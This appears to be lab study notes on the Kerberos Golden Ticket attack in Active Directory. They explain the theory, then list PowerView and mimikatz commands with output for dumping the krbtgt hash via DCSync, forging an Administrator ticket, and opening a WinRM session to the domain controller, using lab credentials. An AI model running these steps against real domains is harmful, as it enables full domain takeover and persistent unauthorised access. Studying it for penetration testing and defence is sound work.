# Golden Ticket

- The **Golden Ticket** attack enables attackers to forge and sign TGTs (Ticket Granting Tickets) using the **krbtgt** account's password hash. When these tickets get presented to an AD server, the information within them will not be checked at all and will be considered valid due to being signed with krbtgt account's password hash. For example, it is possible to sign a ticket for a user that does not exist, such as **DoesNotExist**, have the ticket also say they are a Domain Administrator, and request a TGS (Ticket Granting Service) ticket which enables them to access remote machines. For stealth reasons, it is almost always better to utilize users that exist in the domain. However, putting fake information in the ticket can be a great way to show the impact and the lack of monitoring an organization has around these events. 

- One of the scariest things about the Golden Ticket attack is how often pentesters will gain access to this key; when performing **DCSYNC (using Mimikatz) or SecretsDump (using Impacket)**, the key is KRBTGT's NTLM hash. This account is special because changing its password has to be done twice and cannot be done in rapid succession. The AD Forest must reach full convergence, meaning the change has to replicate across the entire domain before it can be changed again. This is because this key is used for Domain Controllers to authenticate with each other! It should happen within 10 hours, but organizations typically wait 24 hours to minimize the chance of any issue. Within that time Window, if the attacker notices it changed and they grab it again, the process will have to be repeated. 


## Theory

- Following the **TGT request (AS-REQ)**, the Domain Controller sends the user back their TGT. The TGT is a piece of data that contains information about the user. All this information is contained in the **PAC (Privilege Attribute Certificate)**.

- The PAC is copied into each TGS ticket so that service accounts know who they are dealing with. Therefore, this information must be adequately protected so users cannot arbitrarily change it. 

- Domain Controllers use the key of the **krbtgt** account to encrypt TGTs; therefore, it is necessary to know the password of this account to modify a TGT. Within any AD environment, **krbtgt** is the most sensitive and vital account since it ensures that users belong to their appropriate/specific groups. 

- But what happens if an attacker steals the secret of the **krbtgt** account? Well, they can decipher any TGT, thus the PAC within it, arbitrarily modify its information (for example, by making it look like a user belongs to the Domain Admins group) and encrypt it again using the secret of **krbtgt**. This forged ticket is called a **Golden Ticket**. 

- Forging a golden ticket is an excellent technique to maintain persistence within an AD environment. Once full domain compromise is achieved, an attacker can extract the **NTLM hash of the krbtgt account** using **DCSync (or from the NTDS.DIT file using a variety of methods)**. This includes the **domain name, domain SID, name and RID of the account to impersonate (i.e., RID 500 for the built-in administrator account)**, and the RIDs of any groups the account should belong to; once we attain all four pieces of information, a Kerberos ticket can be forged for the target account. 

- Using a **Pass the Ticket** attack, we can import the golden tick to the current session to use tools in the context of the impersonated account. As an attacker, you can forge a ticket to impersonate a sensitive user, who, although privileged in access, may not be a member of heavily monitored groups, such as **Domain Admins and Enterprise Admins**. 


## Windows


Different elements are needed to forge a Golden Ticket: 

1. Domain Name
2. Domain SID
3. Username to Impersonate
4. KRBTGT's hash

- We already know the domain name; let's get the domain's SID by using **Get-DomainSID from PowerView**: 

### Retrieving Domain SID 

- RDP to 10.129.90.25 with user "htb-student" and password "HTB_@cademy_stdnt!"

	xfreerdp /v:10.129.90.25 /u:htb-student /p:'HTB_@cademy_stdnt!' /dynamic-resolution /cert-ignore


	PS C:\Tools> Import-Module .\PowerView.ps1
	PS C:\Tools> Get-DomainSID
	S-1-5-21-1870146311-1183348186-593267556
	

![Get SID](/Kerberos/Ticket-Abuse/images/Get-SID.png) 

- Then, we need to have a compromised **krbtgt** account one way or another to get its NTLM hash. We can use **mimikatz** to forge a Golden Ticket when we have this information. If we compromised an account with DCSync privileges, we can use mimikatz to get the **krbtgt** hash using the following command. 

### Running Mimikatz get the KRBTGT Hash 


	PS C:\Tools> .\mimikatz.exe

	  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
	 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
	 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
	 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
	 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
	  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
	  

	mimikatz # lsadump::dcsync /user:krbtgt /domain:inlanefreight.local
	

- We now have the **krbtgt** NTLM hash, which is **c0231bd8a4a4de92fca0760c0ba9e7a6**. To impersonate the Administrator account, we can use mimikatz to forge the Golden Ticket as follows: 

### Forging the Golden Ticket


	mimikatz # kerberos::golden /domain:inlanefreight.local /user:Administrator /sid:S-1-5-21-1870146311-1183348186-593267556 /rc4:c0231bd8a4a4de92fca0760c0ba9e7a6 /ptt
	User      : Administrator
	Domain    : inlanefreight.local (INLANEFREIGHT)
	SID       : S-1-5-21-1870146311-1183348186-593267556
	User Id   : 500
	Groups Id : *513 512 520 518 519
	ServiceKey: c0231bd8a4a4de92fca0760c0ba9e7a6 - rc4_hmac_nt
	Lifetime  : 1/14/2024 3:59:03 PM ; 1/11/2034 3:59:03 PM ; 1/11/2034 3:59:03 PM
	-> Ticket : ** Pass The Ticket **

	 * PAC generated
	 * PAC signed
	 * EncTicketPart generated
	 * EncTicketPart encrypted
	 * KrbCred generated

	Golden ticket for 'Administrator @ inlanefreight.local' successfully submitted for current session
	
- As we see on the last line (before exit), the Golden Ticket has been created and submitted for the current session. We can double-check this using the **klist command**.


### List the Golden Ticket in the Current Session

![klist](/Kerberos/Ticket-Abuse/images/klist.png) 

- So now have a valid TGT indicating we are **Administrator** and stating that we belong to several groups, including **Domain Admins**. If we need to request a service, we'll ask for a TGS ticket using this TGT, and a copy of the forged PAC will be embedded in the TGS ticket. For example, if we want to access a server using WinRM, we'll have a remote shell as **Administrator**. 


### Using WinRM with the Golden Ticket to Connect to DCO1

	PS C:\Tools> Enter-PSSession dc01
	

![Admin](/Kerberos/Ticket-Abuse/images/admin.png) 

- And if we come back to our original shell, we can see that we now have a TGS ticket for the **HTTP/dc01 SPN as Administrator**. 


### Reviewing the Ticket information 

![Tickets](/Kerberos/Tucket-Abuse/images/tickets.png) 

